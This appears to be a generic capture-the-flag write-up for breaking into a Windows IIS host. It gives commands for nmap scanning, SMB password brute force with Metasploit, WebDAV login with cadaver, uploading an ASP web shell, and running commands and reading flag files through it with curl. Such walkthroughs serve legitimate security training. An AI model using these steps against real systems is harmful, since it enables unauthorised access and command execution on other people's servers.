# Host-Based Attack Walkthrough (Generic)  
  
## Objective  
Gain access to a Windows host, upload a web shell, execute commands, and capture flags hidden in the system.  
  
---  
  
# 1. Enumeration  
  
Start by scanning the target to identify open ports and services.  
  
```bash  
nmap -sS -sV <target>

Look for:

- HTTP (IIS)
- SMB (445)
- RDP (3389)
- WebDAV support

---

# 2. Credential Discovery (Password Guessing)

If a username hint is provided, perform password brute force.

### Using Metasploit

use auxiliary/scanner/smb/smb_login  
set RHOSTS <target>  
set SMBUser <username>  
set PASS_FILE <password_list>  
run

Successful login output example:

[+] <target> - Success: 'user:password'

---

# 3. Test WebDAV Access

Attempt authentication using discovered credentials.

cadaver http://<target>

Login:

Username: <user>  
Password: <password>

List available directories:

ls

Look for:

- webdav
- uploads
- writable directories

---

# 4. Upload Web Shell

Upload ASP web shell:

put /usr/share/webshells/asp/webshell.asp

Confirm upload:

ls

---

# 5. Remote Command Execution

Access the web shell:

http://<target>/webshell.asp

Execute commands:

curl "http://<target>/webshell.asp?cmd=whoami"

---

# 6. System Enumeration

List root directory:

curl "http://<target>/webshell.asp?cmd=dir C:\"

Enumerate users:

curl "http://<target>/webshell.asp?cmd=dir C:\Users"

Check desktops:

curl "http://<target>/webshell.asp?cmd=dir C:\Users\<user>\Desktop"

---

# 7. Locate Flags

Search common locations:

- C:\
- Desktop
- Documents
- Public
- inetpub
- WebDAV directory

Read flag:

curl "http://<target>/webshell.asp?cmd=type C:\path\flag.txt"

---

# 8. WebDAV Protected Directory

If flag is not found in filesystem:

cadaver http://<target>  
cd webdav  
ls  
get flag.txt

---

# Attack Chain Summary

1. Service enumeration
2. Password guessing
3. WebDAV authentication
4. Web shell upload
5. Remote command execution
6. Filesystem enumeration
7. Flag extraction

---

# Techniques Used

- SMB password brute force
- WebDAV abuse
- Web shell upload
- Remote command execution
- Windows filesystem enumeration